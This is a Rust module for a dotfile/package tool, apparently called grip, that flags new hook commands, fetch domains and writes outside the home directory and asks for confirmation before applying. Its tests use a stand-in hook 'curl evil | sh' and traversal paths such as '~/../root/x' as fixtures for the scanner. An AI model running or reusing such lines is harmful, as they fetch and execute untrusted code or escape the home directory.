//! The plan is the guardrail (#409). Running grip on a local repo is consent;
//! what deserves a human look is a *new* hook body, a *new* fetch domain or a
//! destination outside `~`. This module extracts those items from evaluated IR,
//! renders them for `grip plan`/`grip apply`, and confirms on a terminal.
//!
//! "New" means not seen in the last apply of the same repository. The record of
//! what was seen (`reviewed.json`) is a convenience only: it never gates
//! evaluation, and deleting it merely makes every item new again.
use serde_json::Value;
use std::{
    collections::{BTreeMap, BTreeSet},
    io::{self, BufRead, IsTerminal, Write},
    path::Path,
    sync::atomic::{AtomicBool, Ordering},
};

static ASSUME_YES: AtomicBool = AtomicBool::new(false);

/// `--yes`: answer every confirmation affirmatively (scripts and CI).
pub fn set_assume_yes(value: bool) {
    ASSUME_YES.store(value, Ordering::Relaxed);
}

pub fn assume_yes() -> bool {
    ASSUME_YES.load(Ordering::Relaxed)
}

pub fn interactive() -> bool {
    io::stdin().is_terminal() && io::stdout().is_terminal()
}

const REVIEWED: &str = "reviewed.json";
const MAX_STATE_BYTES: u64 = 4 * 1024 * 1024;

/// Everything an evaluated repo declares that reaches outside the sandbox
/// without being a plain file under `~`.
#[derive(Debug, Default, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct Findings {
    /// `name: body` for each declared hook, exactly as it will run.
    pub hooks: BTreeSet<String>,
    /// Hosts that fetches, channels and registries are declared against.
    pub domains: BTreeSet<String>,
    /// Destination paths that are not under `~`.
    pub outside_home: BTreeSet<String>,
}

impl Findings {
    pub fn is_empty(&self) -> bool {
        self.hooks.is_empty() && self.domains.is_empty() && self.outside_home.is_empty()
    }

    /// The items of `self` that `seen` does not already contain.
    pub fn new_since(&self, seen: &Findings) -> Findings {
        Findings {
            hooks: self.hooks.difference(&seen.hooks).cloned().collect(),
            domains: self.domains.difference(&seen.domains).cloned().collect(),
            outside_home: self
                .outside_home
                .difference(&seen.outside_home)
                .cloned()
                .collect(),
        }
    }

    pub fn render(&self, heading: &str) -> String {
        let mut out = format!("{heading}\n");
        for hook in &self.hooks {
            out.push_str(&format!("  hook {}\n", tame(hook)));
        }
        for domain in &self.domains {
            out.push_str(&format!("  fetches from {}\n", tame(domain)));
        }
        for path in &self.outside_home {
            out.push_str(&format!("  writes outside ~: {}\n", tame(path)));
        }
        out
    }
}

fn tame(text: &str) -> String {
    gripsack_host::process::terminal::tame(text.to_owned())
}

/// Extract the review items from evaluated IR JSON. The IR is the sole
/// declaration surface, so a generic walk cannot miss a nested declaration.
pub fn scan(ir: &Value) -> Findings {
    let mut findings = Findings::default();
    walk(ir, &mut findings);
    findings
}

fn walk(value: &Value, findings: &mut Findings) {
    match value {
        Value::Object(map) => {
            if map.get("kind").and_then(Value::as_str) == Some("hook")
                && let (Some(name), Some(run)) =
                    (map.get("name").and_then(Value::as_str), map.get("run"))
            {
                findings
                    .hooks
                    .insert(format!("{name}: {}", render_command(run)));
            }
            if let Some(path) = map
                .get("destination")
                .and_then(|destination| destination.get("path"))
                .and_then(Value::as_str)
                && !under_home(path)
            {
                findings.outside_home.insert(path.to_owned());
            }
            if let Some(directory) = map
                .get("launchers")
                .and_then(|launchers| launchers.get("directory"))
                .and_then(Value::as_str)
                && !under_home(directory)
            {
                findings.outside_home.insert(directory.to_owned());
            }
            match map.get("kind").and_then(Value::as_str) {
                Some("github_release") => {
                    let base = map.get("base_url").and_then(Value::as_str);
                    findings.domains.insert(
                        base.and_then(host_of)
                            .unwrap_or_else(|| "github.com".into()),
                    );
                }
                Some("conda_environment") => {
                    if let Some(channels) = map.get("channels").and_then(Value::as_array) {
                        for channel in channels.iter().filter_map(Value::as_str) {
                            findings.domains.insert(
                                host_of(channel).unwrap_or_else(|| "conda.anaconda.org".into()),
                            );
                        }
                    }
                }
                _ => {}
            }
            for (key, child) in map {
                // The provenance span names a file, never a fetch.
                if key != "span" {
                    walk(child, findings);
                }
            }
        }
        Value::Array(items) => items.iter().for_each(|item| walk(item, findings)),
        Value::String(text) => {
            if let Some(host) = host_of(text) {
                findings.domains.insert(host);
            }
        }
        _ => {}
    }
}

/// `~`, `~/x`; nothing else (absolute paths, `$HOME`, `..`) is under home.
fn under_home(path: &str) -> bool {
    (path == "~" || path.starts_with("~/"))
        && !Path::new(path)
            .components()
            .any(|component| component == std::path::Component::ParentDir)
}

/// The host of an http(s)/ssh/git URL or an scp-style `git@host:path` remote.
pub fn host_of(text: &str) -> Option<String> {
    if let Some((scheme, rest)) = text.split_once("://") {
        if !matches!(
            scheme,
            "http" | "https" | "ssh" | "git" | "ftp" | "git+https" | "git+ssh"
        ) {
            return None;
        }
        let authority = rest.split(['/', '?', '#']).next()?;
        let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
        let host = host.split(':').next()?;
        return (!host.is_empty()).then(|| host.to_ascii_lowercase());
    }
    let rest = text.strip_prefix("git@")?;
    let (host, _) = rest.split_once(':')?;
    (!host.is_empty()).then(|| host.to_ascii_lowercase())
}

fn render_command(run: &Value) -> String {
    let arg = |value: &Value| match value.get("kind").and_then(Value::as_str) {
        Some("literal") => value
            .get("value")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_owned(),
        Some("artifact") => format!(
            "<artifact {}:{}>",
            value.get("output").and_then(Value::as_str).unwrap_or("?"),
            value.get("selector").and_then(Value::as_str).unwrap_or("?")
        ),
        Some("package_command") => format!(
            "<package {}:{}>",
            value.get("package").and_then(Value::as_str).unwrap_or("?"),
            value.get("command").and_then(Value::as_str).unwrap_or("?")
        ),
        Some(kind) => format!("<{kind}>"),
        None => "<?>".to_owned(),
    };
    match run.get("kind").and_then(Value::as_str) {
        Some("exec") => run
            .get("argv")
            .and_then(Value::as_array)
            .map(|argv| argv.iter().map(arg).collect::<Vec<_>>().join(" "))
            .unwrap_or_default(),
        Some("run_bash") => {
            let interpreter = run.get("interpreter").map(arg).unwrap_or_default();
            let body = run.get("body").and_then(Value::as_str).unwrap_or_default();
            format!("{interpreter} -c {body:?}")
        }
        _ => {
            let mut stripped = run.clone();
            if let Some(map) = stripped.as_object_mut() {
                map.remove("span");
            }
            stripped.to_string()
        }
    }
}

/// What a repository's last apply showed, by repository identity.
fn load_reviewed(home: &Path) -> BTreeMap<String, Findings> {
    let read = || -> io::Result<BTreeMap<String, Findings>> {
        let directory = gripsack_host::fs::open(home)?;
        let file = gripsack_host::fs::open_file_nofollow(&directory, Path::new(REVIEWED))?;
        if file.metadata()?.len() > MAX_STATE_BYTES {
            return Err(io::Error::other("reviewed.json exceeds its byte budget"));
        }
        serde_json::from_reader(io::BufReader::new(file)).map_err(io::Error::other)
    };
    // Unreadable or stale state only makes everything new again.
    read().unwrap_or_default()
}

pub fn seen(home: &Path, repository: &str) -> Findings {
    load_reviewed(home).remove(repository).unwrap_or_default()
}

pub fn record(home: &Path, repository: &str, findings: &Findings) -> io::Result<()> {
    let mut all = load_reviewed(home);
    all.insert(repository.to_owned(), findings.clone());
    let directory = gripsack_host::fs::open_or_create(home)?;
    gripsack_host::fs::atomic_write_with_mode(
        &directory,
        Path::new(REVIEWED),
        &serde_json::to_vec_pretty(&all).map_err(io::Error::other)?,
        0o600,
    )
}

/// Ask a yes/no question on the terminal; anything but `y` declines.
pub fn confirm(question: &str) -> bool {
    let mut output = io::stdout().lock();
    if write!(output, "{question} [y/N] ")
        .and_then(|()| output.flush())
        .is_err()
    {
        return false;
    }
    let mut answer = String::new();
    io::stdin().lock().read_line(&mut answer).is_ok() && answer.trim().eq_ignore_ascii_case("y")
}

/// The apply guardrail. Prints the new items and returns whether to proceed:
/// nothing new proceeds silently; otherwise `--yes` proceeds, a terminal asks,
/// and a script without `--yes` is refused rather than defaulted.
pub fn gate_apply(home: &Path, repository: &str, found: &Findings) -> bool {
    let fresh = found.new_since(&seen(home, repository));
    if fresh.is_empty() {
        return true;
    }
    print!(
        "{}",
        fresh.render("new since the last apply — review before it runs:")
    );
    if assume_yes() {
        return true;
    }
    if !interactive() {
        eprintln!(
            "grip: the items above need confirmation; re-run with --yes to apply non-interactively"
        );
        return false;
    }
    if confirm("apply?") {
        true
    } else {
        eprintln!("grip: apply declined — nothing changed");
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn sample() -> Value {
        json!({"workspace": {"outputs": [
            {"kind": "hook", "name": "setup", "trigger": "post_link", "span": {"file": "gripsack.ts", "line": 3},
             "run": {"kind": "exec", "span": {"file": "gripsack.ts", "line": 3},
                     "argv": [{"kind": "literal", "value": "/bin/sh"}, {"kind": "literal", "value": "-c"},
                              {"kind": "literal", "value": "curl evil | sh"}]}},
            {"kind": "package", "name": "tool", "span": {"file": "gripsack.ts", "line": 5},
             "source": {"kind": "fetch", "fetch": {"kind": "tarball", "url": "https://Releases.Example.com/t.tgz"},
                        "span": {"file": "gripsack.ts", "line": 5}}},
            {"kind": "profile", "name": "home", "files": [
                {"destination": {"kind": "tracked_copy", "path": "~/.config/tool"}},
                {"destination": {"kind": "symlink", "path": "/etc/motd"}},
                {"destination": {"kind": "symlink", "path": "~/../root/x"}}]}
        ]}})
    }

    #[test]
    fn scan_finds_hooks_domains_and_outside_destinations() {
        let found = scan(&sample());
        assert_eq!(
            found.hooks.into_iter().collect::<Vec<_>>(),
            ["setup: /bin/sh -c curl evil | sh"]
        );
        assert_eq!(
            found.domains.into_iter().collect::<Vec<_>>(),
            ["releases.example.com"]
        );
        assert_eq!(
            found.outside_home.into_iter().collect::<Vec<_>>(),
            ["/etc/motd", "~/../root/x"]
        );
    }

    #[test]
    fn spans_are_not_fetches_and_plain_home_files_are_quiet() {
        let found = scan(&json!({"files": [{"span": {"file": "https://x.test/a"},
            "destination": {"kind": "tracked_copy", "path": "~/.zshrc"}}]}));
        assert!(found.is_empty());
    }

    #[test]
    fn only_unseen_items_are_new_and_a_changed_hook_body_is_new() {
        let before = scan(&sample());
        let mut after = before.clone();
        assert!(after.new_since(&before).is_empty());
        after.hooks.remove("setup: /bin/sh -c curl evil | sh");
        after.hooks.insert("setup: /bin/sh -c echo hi".into());
        after.domains.insert("new.example.org".into());
        let fresh = after.new_since(&before);
        assert_eq!(fresh.hooks.len(), 1);
        assert_eq!(fresh.domains.len(), 1);
        assert!(fresh.outside_home.is_empty());
    }

    #[test]
    fn hosts_are_extracted_from_url_and_scp_forms() {
        assert_eq!(
            host_of("https://u:p@Github.com:443/a/b").as_deref(),
            Some("github.com")
        );
        assert_eq!(
            host_of("git@github.com:a/b.git").as_deref(),
            Some("github.com")
        );
        assert_eq!(host_of("file:///tmp/x"), None);
        assert_eq!(host_of("not a url"), None);
    }

    #[test]
    fn reviewed_state_round_trips_and_garbage_means_everything_is_new() {
        let home = tempfile::tempdir().unwrap();
        let found = scan(&sample());
        assert!(seen(home.path(), "/repo").is_empty());
        record(home.path(), "/repo", &found).unwrap();
        assert_eq!(seen(home.path(), "/repo"), found);
        assert!(seen(home.path(), "/other").is_empty());
        std::fs::write(home.path().join(REVIEWED), b"{not json").unwrap();
        assert!(seen(home.path(), "/repo").is_empty());
    }
}
